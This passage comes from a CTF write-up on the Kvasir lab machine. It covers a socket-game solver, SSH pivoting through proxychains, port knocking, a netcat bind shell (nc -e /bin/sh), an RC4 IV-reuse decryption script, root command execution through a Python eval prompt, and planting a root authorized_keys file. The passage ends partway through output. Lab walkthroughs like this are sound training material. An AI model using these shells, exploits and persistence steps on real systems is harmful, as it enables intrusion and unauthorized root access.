Solve:iepasncm 

Score: 0
Time: 22.71 secs
Just a bit embarrasing really...
```

Don't think I did too well there! :D Not to fear. I recognized some of the strings after the *Solve:* as ones that are scrambled from the previously found `.words.txt` file. So, my guess here was that I had to write a small script that will connect to the socket and answer with the unscrambled versions from `.words.txt`. With the `.words.txt` file locally available, I slapped together something to try and do this:

```python
#!/usr/bin/python

# Kvasir Terra Puzzle Solver

import sys
import socket
import base64

# read the words.txt we got into a list
with open('words.txt') as f:
    words = f.read().splitlines()

# connection to the game
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('192.168.3.50', 4444))

# start processing the lines
while True:

    # receive a frame large enough
    frame = sock.recv(150)

    # check that its a question frame
    if 'Solve' not in frame:
        print "[!] 'Solve' not in frame. Game over?"
        break

    # split the frame with :
    frame = frame.split(':')
    if len(frame) < 2:
        print "[!] Was unable to split by :. Game over?"
        break
    
    question = frame[1].strip()

    # @barrebas suggested a length check too to increase probability :)
    result = [s for s in words if not s.strip(question) and len(question) == len(s)]
    #result = [s for s in words if not s.strip(question)]

    if len(result) < 1:
        print "[!] Was unable to match anything to %s" % question
        continue

    answer = result[0].strip()
 
    print "[+] Matched %s to %s" % (question, answer)
    sock.send(answer)

# did we win? \:D/
if 'You\'re a winner' in frame:
    print "[+] We won!"

    # read the rest of the socket output
    frame += sock.recv(2500)

    # base64 decode the last string
    print "[+] Extracing and decoding the base64 section"
    print base64.b64decode(frame.split('\n')[-1])
    sys.exit(0)

sock.close

# work with what we have left
print "[+] Last frame was:\n %s" % frame
print "[+] Done"
sys.exit(0)
```

Once you are able to get a score of 120 it seems, you are considered a winner. Once you have won, a fairly large string is output again. This string appeared to be a base64 encoded string, and as a result, I added the `base64.b64decode(frame.split('\n')[-1])` section to the script so that if you win it will print the cleartext version.

The script is not perfect. Sometimes you don’t get 120 as a score and have to run it again. But, within a reasonable amount of attempts you are able to beat the game. A sample run would be:

```bash
root@kali:~# proxychains ./play.py 
ProxyChains-3.1 (http://proxychains.sf.net)
[+] Matched atravdeii to radiative
[+] Matched oilyaerbdmpn to imponderably

[... snip ...]
[+] Matched idmlhkeir to kriemhild
[!] 'Solve' not in frame. Game over?
[+] We won!
[+] Extracing and decoding the base64 section
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,76841822AB9E772FD1D653F6179F0E4D

OrEM2ocnhHKg5nuH7ps1CoOJCihasmFJKLOVNNYFOhGKUojPYEta5yOhIskf0h0r
So+xVDK67G3DlgymUV3DxGfizLfZvhxQRC8Qy0mf4N+miYkvf2NaFtatpNcjK5pM
Uy6QSFMOC8aKpe0FL6UGDRJQ5GSG4DlJrLUJBMvnSLtYZHlaWAICKbXfpXV4STwv
J0D8h9RtlRJhLCK5eKgupYCQIiGQWg3PvZpXk9kkjXhmOQwUYoCRl3l4j5zlnFcT
P6U9UPhRq/Ck4Qrk2dGxFfppQd9xW+b4PWjiSCikLF3Q0hfNNvEbu4ounAgYwPFH
jOXHJqxVog/pZz9Y8XfSP3hz9AYHWfI2iC9Cnk7boRcOv+mcgEeWWkYrVscOivYj
9N2xiNp4GH+NIG8mm/Ldl7jQMl/Vrr5cx3fXjOezmgsSkAY4CcspwKsSXK8GL/bO
hT6pKWfL6UI8wUgpI7KhgK+AOKuS/XPYTSdz+0RJxNFSLOFNcjRtL+NW0UjPq5Jh
Dia+pw5qB+lllxgaN0WBQskIFQpppPowwjG8Jg8jJBjSYj3r4LIrZwJSpcvoBiUA
oCqnQUMtXlMh9/CvBBGs1+JVcjkInBde945V+ejhP6GPYju4TQV7B70d7aEW0OEm
0d7nrOW/LCYpsV/N5rqVsGlTvwjJNowyMqEZ9E09guM5eL4CEPPmp9ZDey2fBAGw
q7nSr8q6Hsf4d+YPR+90EfMJReqI3s1FQoTvx+PaFPiKw7dfHFCgLscXcXcognLz
cB0lnemI+cFmfY74F1eYL3fwJIwSRgK85Xc2My8sqJz1izj6IlO2kQ1jLkrhJOZ8
X+p/9w5zA0x2fbjppHac+YoJfyPyYXjkpigDPjHXhRit2qnUrHfDc0Fjh5AKNU2K
MU/ywXGEg6w0CppK9JBo0u/xJlhT/jOWNiM4YZjXlhQzkxyebvbyRS6Slhlo142l
gMuMUvPn1fAenir6AFwy2rlktQ5/a8z2VCwPkNA40MImSHMWRSFboDjM5zwr24Gk
N0pI1BCmCsf0msvEwLhdcVnhJY7Bg4izm5bX+ArV/ymLOkybK8chz5fryXcjeV1q
izJe2AXZk1/8hY80tvJWjxUEfnguyoozQf5T74mn5aez9JgGWMqzpfKwZ6Lx5cTg
Zu+m+ryakBPFjUtt04lCYCCKWQzPhgIr5xUFx62hCGhh6W8tSIB6k7Hpun123GQ0
uT+R0ErYA5Gdyx44FZEatZ3rXCpVmJllCTWUqBuaHYAtcZThTTZfxRFHy02IT6FW
PLCZ/XN2E+TdtkXmFcTXRsgtyA/5VXsTWWmRcHczv5g5YcQ3pHs3MhSxsWSdTz/8
RYzmxOnCjZWXaUe0Xb7FjA/evmpXsyhChGbvp0K0hZFcMeszFKa8K4pAedcyG31n
4+HhImnEpLZQOXhfXlkKMQXrBys7hkonkDp57Vqh+IIZLGzVmfTVEj2Whc/0Y+GI
DMph0ZvTG+Jgv1LO3Sl82Rzm1jUkzEIZNIxYeSGrZf6ChVLPa85axqw5EVNCxYUg
JAqg+ud6xIO9obidxzI2rLfbxcpMur80nb4crYMNm09yPQaskngK/4IjmnPLeTih
-----END RSA PRIVATE KEY-----
```

A private key? Encrypted though :( Remembering the string I got from the QR code earlier that had no affiliation to anything yet, I tried that as the password to decrypt:

```bash
root@kali:# openssl rsa -in terra_key -out terra_key_nopass
Enter pass phrase for terra_key: # entered Nk9yY31hva8q
writing RSA key

root@kali:~# cat terra_key_nopass 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyekXwhcscSSzT3vw5/eL2h1Bb55vEIOOAkQpIQQ/ldnyT6Yt
w0dAaN71JidjfojzvdaZRNrRY5wkdHUr2t93TJx8vKDZ+n5up4nCKle3p2sz2hKP
DhP7LvxkVTM7Io3qoAYXefggTOWvfoK8X8pXE3xAdIyF4uCXmDjeg6UKoCr5XiWP
12YQEODLd+tp9RH4R/rCaencsNsta45sY1NXtWuJje4HVkPV8ei04ce8SP5PwVhV
sfp2Hxr8g4IKn7ZTwtmkD1SuvmZoyDHNAsToqFt2RiVE9yLQj94Gcagx7PqUijeH
b+4T+6tuDZtjgct4RdYZejnUOYx+iHiSjl6xCQIDAQABAoIBADYOi+fQ4HsiQkeD
fUn9gpnQv1Ys6rtXHUwKB6DpTETIZxFgAlyH1Py+xI+EeCTGcctfiwVeODUc9r2f
KTCeJ4iBVPwDbJieBO4h+bPwbCEMmINH+LjiLJu1wv70il6D9E8Hkn17Ktqrm8KZ
KenTeGClIXSSsr29N5jvkNNZ+nBK116l2TNNSsiWGc3VnezgCuRnDMSuKmA4P/OD
5F/h2/1sC33P1P5zxSMMsUZbm616AXNdv2DxHYm5b7p0L3/wzpZaJ+ZCp9jutbMO
P7XADZrFSn1EOk9blfVQz77GhRUVAotXKv7Jj4x+zHjq2l3n2Jk5RwJLl8iw4vZ+
ActgrskCgYEA5RhweA1naUanRJtlnLY4ywjfpZffPOZovmthqeOYdSJmwdmKvf08
bBR7hRwwlwgD92jeZWC1nK2zjwVpVQqV3sq4+x6Yspp0T5d9hp7PqUvPGglRdPXX
JQjMBV/Q2fK+ydnTz3xImjIvGsoFya9B/COKicu5ugCklCxtdNPJd/8CgYEA4Z9c
cekfgeha7sYe202krz0m03b8IqFaEMBUkEDmr8+RTL2H+9ciu3/2y/0UJ20w3qwe
gWv2OvOmumJ2wi/HVQdoQ9purzKWDdes6QrQsZ6+4eeylQmVmBSOF9YiVudSwyBM
+2rmE4m4qAIVidIJskb6DpB+fxDU1iWFLHlUFvcCgYEArxV8buOfkp+CmjZA9AF3
agQAGCf3Xi2hA1ZBr3rXOz3tVl0RYZ21ncwRkms231Yq4dxtiwDcCz/dKIK0O1/5
pek8cf6yKF1OYr2eG1In1nSvdHCGpmJz6EPO2JSfotGX6d/ltn5/ZgjQYyLeRYMB
ZNcsu57M9FAld3B0voJVSLUCgYACac72VPUGUbLvTOU1mU4CpdfNeT9XK3yoIzaE
WH1fMgwu0vQqaHGxqbu9ENbvWQalyxeEcOAwXzzQT49Pom0yZqLh3utCKntaaI0r
7Pawf68xAWZym6ii+M1QSfUSEuVauvS317vgR5/XBDaww7Ng2cuA7mC8ATUVmU8k
W6PfnwKBgQCBapB8OxxeRoFlnctafkTqtlNU5MGgiUGCCk/NNpDJhzaBuSdxdbRB
bQ6OJjQ9fbjF24w1iOJCGTtMQ0fxer7oxoM8TblM/eYx3Dg6MwsVApP75VdqzSas
mlJnXivwgJkeju+L42BMEl4UaxuhFPBSNCmlLBPj3Hdgyh5LSyIKmw==
-----END RSA PRIVATE KEY-----
```

Considering that **192.168.3.50** was named as `terra` in that `/etc/hosts` file, I attempted authentication using this key on it:

```bash
root@kali:~# proxychains ssh -D 8001 terra@192.168.3.50 -i terra_key_nopass 
ProxyChains-3.1 (http://proxychains.sf.net)
Linux dev2 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sun Nov  9 07:13:31 2014 from 192.168.3.200
terra@dev2:~$
```

As you can see, I also opened another socks proxy locally on port `tcp/8001` in the case for any further pivoting needs. Again, to make sure we understand where in the network we are, consider the following diagram, with the path to `dev2` in red:

{% img https://i.imgur.com/Pt8SFVJ.png %}

##letting myself in via the back door
Enumerating `dev2` did not reveal much interesting information. In fact, the most important clue found was in a mail for `terra` from Locke:

```bash
terra@dev2:~$ cat /var/spool/mail/terra 
Return-path: <locke@192.168.4.100>
Received: from locke by 192.168.4.100 with local (Exim 4.80)
~       (envelope-from <locke@adm>)
~       id 1XHczw-0000V2-8y
~       for terra@192.168.3.50; Wed, 13 Aug 2014 19:10:08 +0100

Date: Wed, 13 Aug 2014 19:10:08 +0100
To: terra@192.168.3.50
Subject: Port Knock
User-Agent: Heirloom mailx 12.5 6/20/10
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-Id: <E1XHczw-0000V2-8y@adm>
From: locke@192.168.4.100
~
Hi Terra,

I've been playing with a port knocking daemon on my PC - see if you can use that to get a shell.
Let me know how it goes.

Regards,
Locke
```

Port knocking daemon eh? Admittedly at this stage again I was kinda stuck. Did I miss the sequence to knock on my way here? While wondering about this, I setup to run a port scan on **192.168.4.100**

```bash
# /etc/proxychains.conf has line
# socks5    127.0.0.1 8001

# scans will appear to be coming from 192.168.4.50 for
# 192.168.4.100
root@kali:~# proxychains nmap -sT 192.168.4.100
ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 6.46 ( http://nmap.org ) at 2014-11-09 17:39 SAST
Nmap scan report for 192.168.4.100
Host is up (0.0018s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 1.75 seconds
```

Only `tcp/22`. :s

I started working back a little bit to some of the previous machines in search for clues, but, found nothing concrete. Remembering the port knocking daemon used in [Knock Knock](http://vulnhub.com/entry/knock-knock-11,105/) (`knockd`), I went and searched for its configuration file, looking for the default port sequence it is configured with. I found the config file [here](https://github.com/jvinet/knock/blob/master/knockd.conf), which revealed the default sequence of: `7000,8000,9000`. So, I tested this by attempting to connect with `nc` to these ports on **192.168.4.100**, and following up with a nmap:

```bash
terra@dev2:~$ nc -v 192.168.4.100 7000 -w 1; nc -v 192.168.4.100 8000 -w 1; nc -v 192.168.4.100 9000 -w 1
192.168.4.100: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.4.100] 7000 (afs3-fileserver) : Connection refused
192.168.4.100: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.4.100] 8000 (?) : Connection refused
192.168.4.100: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.4.100] 9000 (?) : Connection refused
terra@dev2:~$
```

The nmap after the knock:

```bash
root@kali:~# proxychains nmap -sT 192.168.4.100
ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 6.46 ( http://nmap.org ) at 2014-11-09 17:45 SAST
Nmap scan report for 192.168.4.100
Host is up (0.0015s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
1111/tcp open  lmsocialserver

Nmap done: 1 IP address (1 host up) scanned in 1.71 seconds

```

A new port! `tcp/1111` :) Lets check it out.

```bash
root@kali:~# proxychains nc 192.168.4.100 1111
ProxyChains-3.1 (http://proxychains.sf.net)

# a new connection has no output. Only after typing
# 'crap' do you realise you have a sh session open
  
id
uid=1000(locke) gid=1000(locke) groups=1000(locke)
```

Shell access as `locke` on **192.168.4.100**. Nice :D To help me ensure I can comprehend where I am in the network, consider the following diagram, which is turning into a mess thanks to how deep this whole is... The new connection denoted in red again:

{% img https://i.imgur.com/u2klDxc.png %}

##busting kefka
The shell on `adm` as `locke` was nothing more than a `/bin/sh` instance executed over `netcat`. This can be seen in the `littleShell.sh` file in `/home/locke`:

```bash
cat littleShell.sh
#!/bin/sh

/bin/nc -lnp 1111 -e '/bin/sh'
```

Other interesting files were all in `locke`'s home directory:

```bash
pwd
/home/locke
ls -lh
total 332K
-rw-r--r-- 1 locke locke 322K Aug 10 10:32 diskimage.tar.gz
-rwxr--r-- 1 locke locke   42 Aug 13 17:59 littleShell.sh
-rw-r--r-- 1 locke locke  110 Sep  4 13:38 note.txt
```

The `note.txt` file:

```bash
cat note.txt
Looks like Kefka may have been abusing our removable media policy.  I've extracted this image to have a look.
```

Awesome. That gives me a pretty clear idea of where this may be going. My guess was I needed to find something interesting in the `diskimage.tar.gz` file to progress. The first thing I had to do was get a local copy of `diskimage.tar.gz`. Out comes `netcat` again :) I hosted the file on `tcp/4444` on **192.168.4.100** with `nc -lvp 4444 < diskimage.tar.gz | xxd -p`. I then read the file on my attacking machine with `timeout 5 proxychains nc 192.168.4.100 4444 > diskimage.tar.gz` (I gave the file 5 seconds to come over before killing the connection, allowing my other netcat shell to stay alive).

I had to carve out the string *ProxyChains-3.1 (http://proxychains.sf.net)* out of the archive I get locally on disk due to the proxychains command adding this. Luckily it was a simple `dd` on the top line and it was gone :)

I then extracted the archive and ran the resultant archive through `file`:

```bash
root@kali:~# tar xvf diskimage.tar.gz 
diskimage

root@kali:~# file -k diskimage
diskimage: x86 boot sector, code offset 0x3c, OEM-ID "MSDOS5.0", sectors/cluster 2, root entries 512, Media descriptor 0xf8, sectors/FAT 238, heads 255, hidden sectors 63, sectors 122031 (volumes > 32 MB) , reserved 0x1, serial number 0xad6f8bf, unlabeled, FAT (16 bit) DOS executable (COM), boot code
```

Ok, so this really looks like a disk image. I decided to mount it and have a look inside:

```bash
root@kali:~# mount diskimage /mnt/

root@kali:~# ls -lah /mnt/
total 21K
drwxr-xr-x  2 root root  16K Jan  1  1970 .
drwxr-xr-x 23 root root 4.0K Sep 17 13:04 ..
-rwxr-xr-x  1 root root  118 Aug  3 12:10 Secret.rar

# oh! a .rar? Lets extract...
root@kali:~# unrar x /mnt/Secret.rar

UNRAR 4.10 freeware      Copyright (c) 1993-2012 Alexander Roshal


Extracting from /mnt/Secret.rar

Enter password (will not be echoed) for MyPassword.txt: 

No files to extract
```

A `.rar` archive, but no password to extract. Aaaand again, I was stuck. My guess was there was some forensics aspect to this, and that the disk image may be more than just a disk image...

Some googling around got me a hit on a tool called `autopsy`, which is a disk image analysis framework. I cared little for the case files features and what not, but much rather the actual analysis features. I fired up the tool from the Kali menu, and browsed to the web interface. I had a whole bunch of prompts to work through, and eventually came to a view that allowed me to inspect the disk:

{% img https://i.imgur.com/SBIbnMU.png %}

`C:/Funky.wav`. Now that is not something I saw when I had the disk mounted :D. I downloaded the file via the *Export* link, copied it to my laptop (my Kali doesnt have sound for whatever reason) and fired up the speakers to have a listen.

It sounded like this:

{% img https://i.imgur.com/IbdKBKR.gif %}

Yeah, I don't get it either. I was stumped for a few minutes again, until I remembered [Xerxes2](http://vulnhub.com/entry/xerxes-201,97/), which has a similar strange sounding file, but with a hidden message viewable via a spectrogram generated by [Sonic Visualizer](http://www.sonicvisualiser.org/index.html). I downloaded the app, loaded the wav file and got the spectrogram to do its thing:

{% img https://i.imgur.com/7bxW0Xc.png %}

*OrcWQi5VhfCo*. Was this the password for the `.rar` archive?

```bash
root@kali:~# unrar x /mnt/Secret.rar

UNRAR 4.10 freeware      Copyright (c) 1993-2012 Alexander Roshal


Extracting from /mnt/Secret.rar

Enter password (will not be echoed) for MyPassword.txt: 

Extracting  MyPassword.txt                                            OK 
All OK
root@kali:~# cat MyPassword.txt 
5224XbG5ki2C
```

Yep! However, another random string. Remembering the note about this being a disk image from `kefka`, I attempted to SSH into **192.168.4.100** as `kefka` with this password:

```bash
root@kali:~# proxychains ssh -D 8002 kefka@192.168.4.100
ProxyChains-3.1 (http://proxychains.sf.net)
kefka@192.168.4.100's password: # entered 5224XbG5ki2C
Linux adm 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov  9 07:14:02 2014 from 192.168.4.50
kefka@adm:~$
```

A final `tcp/8002` proxy was opened on my attacking machine.

##taking the last ride to the flag
Enumeration as kefka revealed that this user is allowed to run `/opt/wep2.py` as root. This is almost screaming at me as the privilege escalation path!

I ran the script with sudo, just to be presented with... nothing :/ No matter what I typed in, I received no output. That was until I ^C the application and receive a traceback, hinting towards the fact that it may have opened a socket:

```bash
kefka@adm:~$ sudo /opt/wep2.py
^CTraceback (most recent call last):
  File "/opt/wep2.py", line 93, in <module>
    sock, addr = s.accept()
  File "/usr/lib/python2.7/socket.py", line 202, in accept
    sock, addr = self._sock.accept()
KeyboardInterrupt
kefka@adm:~$
```

I re-run the script backgrounding it with `&`, and inspect the output of `netstat -pant` to reveal a port 1234 to be open. From my attacking machine, I connected to the socket using proxychains on the new `tcp/8002` proxy. The 127.0.0.1 is in fact 192.168.4.100 and not my actual localhost:

```bash
# /etc/proxychains.conf has line
# socks5    127.0.0.1 8002

# connections will appear to be coming from localhost
root@kali:~# proxychains nc -v 127.0.0.1 1234
ProxyChains-3.1 (http://proxychains.sf.net)
127.0.0.1: inverse host lookup failed: 
(UNKNOWN) [127.0.0.1] 1234 (?) open : Operation now in progress
=============================
Can you retrieve my secret..?
=============================

Usage:
'V' to view the encrypted flag
'E' to encrypt a plaintext string (e.g. 'E AAAA')

V
5a5062:36507a63b56865f7fd201860
^C
root@kali:~#
```

We are presented with yet another *game*, this time, something completely different. I played a little with the output, attempting to escape the environment. Most input would be picked up as invalid input, and the `netcat` connection killed, causing me to have to re-run `sudo /opt/wep2.py` on the kefka session.

By now, I was pretty exhausted from everything Kvasir has thrown at me and the rabbit hole has become pretty deep and dark. From testing the above game, I guessed that the output for commands were `salt:cyphertext`, which changes for anything you throw at it. Furthermore, the game allows you to encrypt known clear text. As a test, I tested with *A*, and studied the output:

```bash
E A
348bbc:8d
E A
f2fb0c:6e
E A
64d7fb:2d
```

Assuming the first part is the salt, my text is encrypted and presented as a single hex byte. Other than that, I am not really sure what my attack vectors are, if any.

Taking it easy for a while, I had a chat to @barrebas on how far I am with Kvasir, when he mentioned that the filename `wep2.py` should be taken as a hint!

*This had to be the hardest part of the entire challenge for me personally. The largest part of this was spent reading reading reading and more reading! Ofc, this is also my biggest take from Kvasir :)*

###understanding what WEP actually is
With the limited interaction I have had with the last game, and the hint `wep2`, I set out to test my Google-fu. I know there is no such thing as WEP2, but there is WPA2. So the first part was to determine if the hint is something like WEP or WPA2.

Some resources that really helped me get to grips with what we are facing here was:
 http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf
 http://www.csee.umbc.edu/courses/graduate/CMSC628/spring2002/ppt/kunjan.ppt
 http://www.cs.berkeley.edu/~daw/talks/HPColloq03.ppt
 http://www.cs.unb.ca/~ken/papers/cnsr2004.pdf

Of the above list, I highly recommend you check out the `.ppt`'s. As lame as it may seem, it really helped me just over the cliff into understanding what I was facing here and what the fundamental problem is that I should be exploiting.

The reading on WPA revealed that a encrypted packet is determined similar to a RC4 stream cipher is. Let *C* be the cipher text and *P* be the plain text. A publicly known Initialization Vector and a Secret Key as a function of RC4 is ^ (XOR'd) with the plaintext to produce the cipher text. Typically, this is represented as:

**C = P ^ RC4(iv, k)**

With that now known, we can learn about vulnerabilities in this algorithm. More specifically, about [Stream Cipher Attacks](http://en.wikipedia.org/wiki/Stream_cipher_attack) and [Related Key Attacks](http://en.wikipedia.org/wiki/Related-key_attack). With all of the knowledge gained with close to 6 hours of almost straight googling, I was ready to get going at trying something.

My initial understanding was as follows; If I can get 2 unique plaintext’s encrypted using the same IV's, I can XOR the cipher text of the known clear text with the actual clear text to determine the key stream for that IV. Then XOR that key stream with the cipher text I wanted to decrypt. Considering I was able to create encryption samples, I decided not to spend any time on WPA2 and concluded the `2` in `wep2` was another troll :)

###attacking the encryption game
Armed with the knowledge I had now, I started to write some skeleton code to interact with the socket. This was very basic and simply sent and received frames as required.

I then decided on 2 strings to test. The first being (A * 24), the second being (B * 24). The idea was to send the first string (A * 24) 1000 times, and record the IV:CIPHER_TEXT in a python dictionary. I would then loop a second time using a string of (B * 24), each time doing a lookup in the dictionary for a matching IV. If one is found, it means we have 2 known plain texts (A * 24 and B * 24), 2 known cipher texts and their common IV (iv collision in fact).

Once the collision is found, I would then XOR the Cipher Text with the Clear Text to determine the key stream, and finally, XOR the key stream with any cipher text sharing the same IV to determine the clear text.

I completed the python skeleton script to do the actual XOR and IV matching work, and after a few hours, had successful runs in decrypting using the key derived from the (A *24) plaintext's cipher text:

```bash
root@kali:~# proxychains ./un_wep-testing.py
ProxyChains-3.1 (http://proxychains.sf.net)
[+] Generating base iv:cy dictionary with 'A' *24
[+] iv_dict knows about 5000 combinations
[+] Starting Bruteforce with 'B' *24
[+] Frame matched IV of 929d87 in 4559 tries!
[+] Base Cyper Text was: c5bdd075b0b1de9e9a663999a860a53348cafea5f73c794b
[+] Matched Cypher Text: c6bed376b3b2dd9d99653a9aab63a6304bc9fda6f43f7a48

[+] A ^ B
BBBBBBBBBBBBBBBBBBBBBBBB
[+] Done
```

This was great news, but it did not decrypt our flag :) For that, I had to bring some modifications to the code. Firstly, I tested with (A * 24) because if I know the plain text, testing is easier. I do not know the plaintext for the encrypted flag yet, so I had to be 100% sure the theory works before maybe getting a wrong answer from the flag decryption. So, I changed the IV dictionary generation from encrypting (A *24) 5000 times to requesting the encrypted flag 5000 times.

With the changes in, I ended up with the following script:

```bash
#!/usr/bin/python

# Kvasir RC4 Key Re-use Attack

import socket

# start a fresh iv_dict used for lookups
iv_dict = {}

# connection to the thing
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1', 1234))

# read the banner so we can continue

# =============================
# Can you retrieve my secret..?
# =============================
# 
# Usage:
# 'V' to view the encrypted flag
# 'E' to encrypt a plaintext string (e.g. 'E AAAA')
banner = sock.recv(1024)

# create some iv:cyper combinations of the flag
print '[+] Generating base iv:cy dictionary'
for i in range(0,5000):
    sock.send('V\n')
    frame = sock.recv(150)
    iv = frame.split(':')[0]
    cy = frame.split(':')[1]

    # add the values
    iv_dict[iv] = cy.strip()
print '[+] The iv_dict knows about %d combinations' % len(iv_dict)

# start processing the second string, looking up the IV
print '[+] Starting Bruteforce with \'B\' *24'
count = 0
while True:

    count += 1
    sock.send('E ' + 'B' *24 + '\n')
    frame = sock.recv(150)
    iv = frame.split(':')[0]
    cy = frame.split(':')[1].strip() # annoying \n

    if iv in iv_dict:
        print '[+] Frame matched IV of %s in %d tries!' % (iv, count)
        print '[+] Base Cyper Text was: %s' % iv_dict[iv]
        print '[+] Matched Cypher Text: %s' % cy

        # first XOR to get the keystream for this IV
        keystream = ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(cy.decode("hex"),'B'*24))
        print '[+] Keystream: %s' % keystream.encode("hex")

        # then decode second cypher text using the keystream for the cleartext
        decrypted = ''.join(chr(ord(a) ^ ord(b)) for a,b in zip((iv_dict[iv]).decode("hex"),keystream))
        print '[+] Decrytped flag is: %s' % decrypted
        break

    # progress incase things take longer than expected
    if count % 100000 == 0:
        print '[+] Tries: %d' % count

print '[+] Done'
sock.close()
```

In no time at all, the above code outputs the decrypted flag:

```bash
root@kali:~# proxychains ./un_wep.py
ProxyChains-3.1 (http://proxychains.sf.net)
[+] Generating base iv:cy dictionary
[+] The iv_dict knows about 5000 combinations
[+] Starting Bruteforce with 'B' *24
[+] Frame matched IV of 06f39e in 1696 tries!
[+] Base Cyper Text was: 02bf9ad2d5629c9f530b39a6
[+] Matched Cypher Text: 70aaeec5a156a99a251e4ab2217436ae08a64b5ce0c21c9c
[+] Keystream: 32e8ac87e314ebd8675c08f0633674ec4ae4091ea2805ede
[+] Decrytped flag is: 0W6U6vwG4W1V
[+] Done
```

`0W6U6vwG4W1V`. Seriously. All that work for another string. :( I immediately started to doubt if I nailed this. I tested this as the root password for all the previous machines I have not been root on yet to no avail. Then, I looked at the clock as saw it was 3am... bed time for me!!

##finally getting the flag, sort of...
I woke up 7am, immediately thinking about this small string and the amount of work that went into getting it. I double checked my theory and script to make sure I am not missing something, but everything seemed to look fine.

After a breath of fresh air, I reconnected to the game and slapped the string in and pressed enter:

```bash
root@kali:~# proxychains nc -v 127.0.0.1 1234
ProxyChains-3.1 (http://proxychains.sf.net)
127.0.0.1: inverse host lookup failed: 
(UNKNOWN) [127.0.0.1] 1234 (?) open : Operation now in progress
=============================
Can you retrieve my secret..?
=============================

Usage:
'V' to view the encrypted flag
'E' to encrypt a plaintext string (e.g. 'E AAAA')

0W6U6vwG4W1V
>
```

Wut. Ok, so I have a *thing* now. It didn’t accept anything I was typing into it. Everything just came back with another `>`. 

```bash
> ls
> id
> whoami
> ls -lah
> uname -a
> help
> ?
> 
```

I disconnected from the netcat session and tabbed back to the session where the `/opt/wep2.py` script is started. Immediately it became clear what was going on:

```bash
kefka@adm:~$ sudo /opt/wep2.py
Traceback (most recent call last):
  File "<string>", line 1, in <module>
NameError: name 'ls' is not defined
Traceback (most recent call last):
  File "<string>", line 1, in <module>
NameError: name 'whoami' is not defined
Traceback (most recent call last):
  File "<string>", line 1, in <module>
NameError: name 'ls' is not defined
Traceback (most recent call last):
  File "<string>", line 1, in <module>
NameError: name 'uname' is not defined
  File "<string>", line 1
    ?
    ^
SyntaxError: invalid syntax
Traceback (most recent call last):
  File "/opt/wep2.py", line 94, in <module>
    handler(sock, addr)
  File "/opt/wep2.py", line 74, in handler
    sock.send(p1)
socket.error: [Errno 32] Broken pipe
kefka@adm:~$
```

It seems like I have a kind of python shell? After a bit of fiddling around, I eventually started getting something usefull out of it:

```bash
0W6U6vwG4W1V
> import os; os.system('id');
uid=0(root) gid=0(root) groups=0(root)
```

Yay :) I went straight for the `cat /root/flag`:

```bash
> import os; os.system('cat /root/flag');
    _  __                             _            
   | |/ /   __ __   __ _     ___     (_)      _ _  
   | ' <    \ I /  / _` |   (_-<     | |     | '_| 
   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_  
  _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
  "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 

Pbatenghyngvbaf ba orngvat Xinfve - V ubcr lbh rawblrq
gur evqr.  Gnxr uvf oybbq, zvk jvgu ubarl naq qevax 
gur Zrnq bs Cbrgel...

Ovt fubhg bhg gb zl orgn grfgref: @oneeronf naq @GurPbybavny.
Fcrpvny gunaxf gb Onf sbe uvf cngvrapr qhevat guvf raqrnibhe.

Srry serr gb cvat zr jvgu gubhtugf/pbzzragf ba
uggc://jv-sh.pb.hx, #IhyaUho VEP be Gjvggre.

  enfgn_zbhfr(@_EnfgnZbhfr)
> 
```

Err, oh [@_RastaMouse](https://twitter.com/_RastaMouse) you!! What is this? I figured I need to get a proper shell going to make life a little easier for myself. I did this by using the command execution we have now to prepare a authorized_keys file for root for me, adding the public key of the key pair I initially created. Then, finally, I SSH'd in as root:

```bash
root@kali:~# proxychains ssh root@127.0.0.1 -i kvasir_key
ProxyChains-3.1 (http://proxychains.sf.net)
Linux adm 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov  9 16:57:16 2014 from localhost
root@adm:~#
```

##the final troll
With the `/root/flag` in a really strange format, I poked around a little to see what is going on. Eventually I went down to a python shell, loaded the flag and fiddled with `decode()` again:

```bash
root@adm:~# python
Python 2.7.3 (default, Mar 13 2014, 11:03:55) 
[GCC 4.7.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> with open('/root/flag') as f:
...     flag = f.read()
... 
>>> print flag.decode('rot13')
    _  __                             _            
   | |/ /   __ __   __ _     ___     (_)      _ _  
   | ' <    \ V /  / _` |   (_-<     | |     | '_| 
   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_  
  _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
